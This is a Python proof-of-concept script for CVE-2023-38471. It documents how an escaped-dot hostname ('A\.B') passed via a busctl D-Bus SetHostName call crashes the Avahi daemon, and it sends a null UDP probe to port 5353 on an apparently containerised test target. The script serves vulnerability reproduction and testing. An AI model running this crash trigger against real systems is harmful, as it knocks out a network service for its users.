#!/usr/bin/env python3
"""
PoC for CVE-2023-38471 - Avahi invalid-escape crash in
avahi_server_set_host_name() (avahi-core/server.c).

Root cause: v0.8 does `hn[strcspn(hn, ".")] = 0`, truncating at the FIRST
dot even when that dot is escaped ("A\\.B" is a single valid label). The
truncation produces a dangling escape ("A\\") and the daemon crashes in the
domain-equal / validity path. Fixed in commit 894f085f by extracting the
label with avahi_unescape_label() and returning AVAHI_ERR_INVALID_HOST_NAME.

TRANSPORT (honest): this function is reached via the D-Bus method
    org.freedesktop.Avahi.Server2.SetHostName("s", "A\\.B")
i.e. a LOCAL D-Bus call, NOT a raw mDNS 5353 network packet. The original
busctl reproducer is:

    busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server2 \\
        SetHostName s 'A\\.B'

The vulnerable container's harness drives the same genuine public API
function (avahi_server_set_host_name) directly with the reproducer string,
so it aborts on startup. This script only documents the trigger and pokes
the container's mDNS UDP endpoint for liveness.

Check `docker logs <container>` for an abort/SEGV with the trace landing in
avahi_server_set_host_name (avahi-core/server.c).
"""
import socket
import sys


def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 5353

    print("[*] CVE-2023-38471: avahi_server_set_host_name(\"A\\\\.B\") crash")
    print("[*] D-Bus reproducer (local transport, NOT raw mDNS):")
    print("      busctl call org.freedesktop.Avahi / "
          "org.freedesktop.Avahi.Server2 SetHostName s 'A\\.B'")
    print(f"[*] poking mDNS UDP {host}:{port} for liveness...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(2.0)
    try:
        s.sendto(b"\x00" * 12, (host, port))
        try:
            data, addr = s.recvfrom(4096)
            print(f"[*] response {len(data)} bytes from {addr}")
        except socket.timeout:
            print("[*] no response (harness aborted on set_host_name). "
                  "Check `docker logs` for the trace.")
    finally:
        s.close()
    print("[*] Expected: abort/SEGV in avahi_server_set_host_name "
          "(avahi-core/server.c)")


if __name__ == "__main__":
    main()
